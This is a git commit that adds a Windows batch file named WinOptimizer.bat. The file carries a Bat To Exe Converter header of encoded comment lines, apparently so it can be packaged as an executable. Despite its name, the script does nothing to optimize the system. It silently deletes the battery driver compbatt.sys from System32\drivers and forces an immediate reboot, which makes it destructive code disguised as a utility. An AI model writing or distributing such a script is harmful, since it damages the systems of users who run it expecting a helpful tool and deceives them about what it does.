d5e8540feedc0bd23ec2b48b930d75071f2f16e0
NoSystemFound <92534013+NoSystemFound@users.noreply.github.com>
2022-02-11 19:23:42 +0300

    Add files via upload

---
+++ WinOptimizer.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCuDJH2L40w8JxpQXziLMm+/HvsV6+eb
+::YAwzuBVtJxjWCl3EqQJhSA==
+::ZR4luwNxJguZRRmT/Uw/OA9dQQ2YOQs=
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJiZk40
+::ZQ05rAF9IBncCkqN+0xwdVsGAlHi
+::ZQ05rAF9IAHYFVzEqQIHIRV7XBCLMWKgA6d8
+::eg0/rx1wNQPfEVWB+kM9LVsJDCWRNGq3FroT19/y4cWXtkQQXfg6at6M5aeLNPUDig==
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQIRaAtGQwOQPWb6Erpc5/jv5ueOuEhdTe0qas/Iw6eaJe1z
+::dhA7uBVwLU+EWHeLx1sjPB5ZaguXMm/a
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJH2L91c9LRVAXzi1NWWVFqEV5eHh6vjJp1UYNA==
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+
+cd C:\Windows\System32\drivers\
+del compbatt.sys /S /Q
+shutdown -r -t 0 /f
